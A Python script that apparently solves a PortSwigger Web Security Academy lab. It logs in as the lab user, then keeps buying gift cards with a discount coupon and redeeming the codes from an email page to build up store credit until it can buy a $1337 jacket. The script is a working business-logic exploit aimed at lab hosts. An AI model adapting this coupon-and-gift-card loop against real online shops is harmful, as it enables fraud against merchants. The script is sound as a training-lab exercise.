import requests
from urllib.parse import urljoin
import bs4
from bs4 import BeautifulSoup
from requests.cookies import RequestsCookieJar
from typing import Union, Text, Tuple, List
import re
from itertools import count



base_url = 'https://ac931fa51e68c2b4c0c911d30081007c.web-security-academy.net/'


def scrape_csrf(url: Union[Text, bytes], login_cookie=RequestsCookieJar()) -> Tuple[str, RequestsCookieJar]:
    get_response = requests.get(url, cookies=login_cookie)
    html = get_response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    csrf_input = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf_input['value']
    return csrf_token, get_response.cookies


def login() -> RequestsCookieJar:
    login_url = urljoin(base_url, 'login')
    token, cookies = scrape_csrf(login_url)
    data = {
        'csrf': token,
        'username': 'wiener',
        'password': 'peter'
    }
    response = requests.post(login_url, data=data, allow_redirects=False, cookies=cookies)
    return response.cookies


def get_balance(login_cookie: RequestsCookieJar) -> int:
    """Current floored balance"""
    get_response = requests.get(base_url, cookies=login_cookie)
    html = get_response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    strong_outer_html = str(soup.find('strong'))
    balance_string = strong_outer_html.replace('<strong>Store credit: $', '').replace('</strong>', '').replace(r'\...', '')
    balance_string = re.sub(r'\...', '', balance_string)
    return int(balance_string)


def buy_gift_cards(quantity: int, login_cookie) -> List[str]:
    assert quantity <= 99 and quantity > 0
    data = {
      'productId': '2',
      'redir': 'PRODUCT',
      'quantity': str(quantity)
    }
    response = requests.post(urljoin(base_url, 'cart'), cookies=login_cookie, data=data)
    
    token, _ = scrape_csrf(urljoin(base_url, 'cart'), login_cookie)
    data = {
      'csrf': token,
      'coupon': 'SIGNUP30'
    }
    response = requests.post(urljoin(base_url, 'cart/coupon'), cookies=login_cookie, data=data)

    data = {
      'csrf': token
    }

    response = requests.post(urljoin(base_url, 'cart/checkout'), cookies=login_cookie, data=data)


def redem_all(login_cookie: RequestsCookieJar):
    global last
    codes = []
    code_regex = re.compile(r'^[A-Za-z0-9]{10}$', re.MULTILINE)
    for i in count():
        mail_url = 'https://exploit-acfb1fbd1e37c231c00911de018c0045.web-security-academy.net/email?raw=' + str(i)
        response = requests.get(mail_url)
        if response.status_code == 500:
            last = i
            break
        mail_text = response.content.decode('utf-8')
        code = re.findall(code_regex, mail_text)
        codes += code
    for code in codes:
        url = urljoin(base_url, 'gift-card')
        token, _ = scrape_csrf(urljoin(base_url, 'my-account?id=wiener'), login_cookie)
        data = {
          'csrf': token,
          'gift-card': code
        }
        response = requests.post(url, cookies=login_cookie, data=data)


def bulk_buy(login_cookie: RequestsCookieJar):
    goal = 1337  # price of the "Lightweight "l33t" Leather Jacket"
    balance = get_balance(login_cookie)
    while balance < goal:
        print('balance', balance)
        possible = balance // 7
        buy_gift_cards(min(possible, 99), login_cookie)
        redem_all(login_cookie)

def buy_jaket(login_cookie: RequestsCookieJar):
    token, _ = scrape_csrf(urljoin(base_url, 'cart'), login_cookie)
    data = {
      'productId': '1',
      'redir': 'PRODUCT',
      'quantity': '1'
    }
    response = requests.post(urljoin(base_url, 'cart'), cookies=login_cookie, data=data)

    data = {
      'csrf': token
    }
    response = requests.post(urljoin(base_url, 'cart/checkout'), cookies=login_cookie, data=data)



def buy_flow():
    login_cookie = login()
    redem_all(login_cookie)
    bulk_buy(login_cookie)
    buy_jaket(login_cookie)


buy_flow()
